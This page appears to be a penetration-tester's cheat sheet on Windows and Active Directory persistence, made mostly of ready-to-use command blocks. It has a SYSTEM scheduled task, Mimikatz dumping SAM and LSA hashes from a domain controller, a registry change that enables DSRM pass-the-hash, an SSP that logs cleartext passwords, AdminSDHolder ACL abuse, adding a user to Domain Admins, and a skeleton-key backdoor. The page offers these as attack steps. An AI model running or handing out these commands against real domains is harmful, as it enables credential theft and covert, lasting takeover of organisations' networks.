# Persistence

### Scheduled Task

```text
schtasks /create  /tn "xct" /ru "SYSTEM" /tr "c:\temp\xct.exe" /sc DAILY
schtasks /run /tn "xct"
schtasks /query /tn "xct" /FO list /v
schtasks /delete /tn "xct" /f
```

### WMI Subscriptions \(Covenant\)

Run "PersistWMI", this will execute along another program. E.g. the victim opens chrome our persistence calls back.

### SRM

Directory Services Restore Mode Password only needed on promotion to DC, rarely used and changed, so we either obtain or change it:

```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <dc>
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <dc>
# Compare hashes, first one is DSRM
# We can pth into the dc with the ntlm hash of the dsrm, but first we have to change his logon behaviour
Enter-PSSession -Computername <dc>
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
# Pth into it
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
```

### Custom SSP

Security Support Provider, with mimikatz, mimilib.dll, which logs all passwords in cleartext:

```bash
Invoke-Mimikatz -Command '"misc::memssp"'
```

### Admin-SD Holder

Adds user to domain admin group \(PowerView\):

```bash
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName <username> -Rights All -Verbose
$session = New-PSSession -ComputerName <dc>
Invoke-Command -FilePath .\Invoke-SDPropagator -Session $session
Enter-PSSession -Session $session
```

### Add user to domain admins

```bash
Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> -Verbose
```

### Skeleton Key

```bash
# This lets you log into every account with the password "mimikatz", you should compile it yourself and change that probably. You might also need to remove process protection before running it
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <name>
```

### AppInit DLLs

{% embed url="https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/" %}

### NetSH Persistence

{% embed url="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" %}

### Universal Password Backdoors with Frida

{% embed url="https://sensepost.com/blog/2019/recreating-known-universal-windows-password-backdoors-with-frida/" %}



